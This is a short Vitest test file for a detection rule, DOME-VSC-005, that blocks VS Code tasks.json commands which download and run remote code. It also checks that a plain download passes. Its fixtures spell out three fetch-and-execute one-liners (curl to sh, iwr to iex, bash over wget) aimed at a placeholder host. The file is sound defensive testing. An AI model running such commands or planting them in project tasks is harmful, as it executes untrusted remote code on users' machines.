import { describe, expect, it } from 'vitest';
import { runRule } from '../__fixtures__/run-rule.js';
import rule from './vsc-005.js';

describe('DOME-VSC-005', () => {
  it.each([
    'curl -fsSL https://example.invalid/DOME_FIXTURE | sh',
    'iwr https://example.invalid/DOME_FIXTURE | iex',
    'bash -c "$(wget -qO- https://example.invalid/DOME_FIXTURE)"',
  ])('blocks %s', async (command) => {
    expect(await runRule(rule, { '.vscode/tasks.json': JSON.stringify({ tasks: [{ command }] }) })).toHaveLength(1);
  });

  it('allows downloads that are not executed', async () => {
    const tasks = JSON.stringify({ tasks: [{ command: 'curl -o data.json https://example.invalid' }] });
    expect(await runRule(rule, { '.vscode/tasks.json': tasks })).toEqual([]);
  });
});
